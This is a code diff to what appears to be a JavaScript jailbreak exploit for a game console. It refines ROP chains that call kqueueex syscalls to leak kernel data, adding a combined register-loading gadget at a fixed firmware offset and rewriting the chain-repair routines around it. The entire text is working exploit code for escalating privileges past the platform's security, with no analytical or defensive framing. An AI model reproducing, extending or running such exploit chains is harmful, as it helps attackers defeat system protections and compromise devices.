@@ -82,6 +82,11 @@
         for (const k in SYSCALL_EXTRA) {
             if (!(k in SYSCALL)) SYSCALL[k] = SYSCALL_EXTRA[k];
         }
+        if (!("pop_rax_pop_rdi" in ROP)) {
+            Object.defineProperty(ROP, "pop_rax_pop_rdi", {
+                get: function () { return eboot_base + 0xE2F1A4n; },
+            });
+        }
 
         const FW_OFFSETS_P2JB = {
             "9.00": {
@@ -214,7 +219,8 @@
             return read64(thr_handle);
         }
 
-        function build_leak_worker_chain(core, pipe_rfd, finished_addr, dummybuf, unroll, remainder) {
+        function build_leak_worker_chain(core, pipe_rfd, finished_addr, dummybuf,
+            unroll, remainder) {
             const POC_ARG = 0x800000000000n;
             const EXIT_MARK = 0xDEADn;
             const STACK_SIZE = 0x4000 + (unroll * 31 + remainder * 6 + 0x200) * 8;
@@ -254,15 +260,13 @@
             const kqBase = [];
             for (let k = 0; k < unroll; k++) {
                 kqBase.push(idx);
-                emit(ROP.pop_rax); emit(SYSCALL.kqueueex);
-                emit(ROP.pop_rdi); emit(POC_ARG);
+                emit(ROP.pop_rax_pop_rdi); emit(SYSCALL.kqueueex); emit(POC_ARG);
                 emit(syscall_wrapper);
                 emit(ROP.ret);
             }
 
             const repairSlot = (slotIdx, value) => {
-                emit(ROP.pop_rdi); emit(at(slotIdx));
-                emit(ROP.pop_rax); emit(value);
+                emit(ROP.pop_rax_pop_rdi); emit(value); emit(at(slotIdx));
                 emit(ROP.mov_qword_rdi_rax);
             };
             repairSlot(readBase + 0, ROP.pop_rax);
@@ -277,22 +281,21 @@
             if (LEAK_KQ_REPAIR_MODE === "full") {
                 for (let k = 0; k < unroll; k++) {
                     const b = kqBase[k];
-                    repairSlot(b + 0, ROP.pop_rax);
+                    repairSlot(b + 0, ROP.pop_rax_pop_rdi);
                     repairSlot(b + 1, SYSCALL.kqueueex);
-                    repairSlot(b + 2, ROP.pop_rdi);
-                    repairSlot(b + 3, POC_ARG);
-                    repairSlot(b + 4, syscall_wrapper);
+                    repairSlot(b + 2, POC_ARG);
+                    repairSlot(b + 3, syscall_wrapper);
                 }
             } else if (LEAK_KQ_REPAIR_MODE === "wrapper") {
                 for (let k = 0; k < unroll; k++) {
-                    repairSlot(kqBase[k] + 4, syscall_wrapper);
+                    repairSlot(kqBase[k] + 3, syscall_wrapper);
                 }
             } else if (LEAK_KQ_REPAIR_MODE === "args") {
                 for (let k = 0; k < unroll; k++) {
                     const b = kqBase[k];
                     repairSlot(b + 1, SYSCALL.kqueueex);
-                    repairSlot(b + 3, POC_ARG);
-                    repairSlot(b + 4, syscall_wrapper);
+                    repairSlot(b + 2, POC_ARG);
+                    repairSlot(b + 3, syscall_wrapper);
                 }
             }
 
@@ -306,8 +309,7 @@
             if (idx % 2 !== 0) emit(ROP.ret);
             const EXIT = idx;
             for (let k = 0; k < remainder; k++) {
-                emit(ROP.pop_rax); emit(SYSCALL.kqueueex);
-                emit(ROP.pop_rdi); emit(POC_ARG);
+                emit(ROP.pop_rax_pop_rdi); emit(SYSCALL.kqueueex); emit(POC_ARG);
                 emit(syscall_wrapper);
                 emit(ROP.ret);
             }
@@ -461,8 +463,7 @@
             emit(ROP.ret);
 
             const repairSlot = (slotIdx, value) => {
-                emit(ROP.pop_rdi); emit(at(slotIdx));
-                emit(ROP.pop_rax); emit(value);
+                emit(ROP.pop_rax_pop_rdi); emit(value); emit(at(slotIdx));
                 emit(ROP.mov_qword_rdi_rax);
             };
             repairSlot(readBase + 0, ROP.pop_rax);
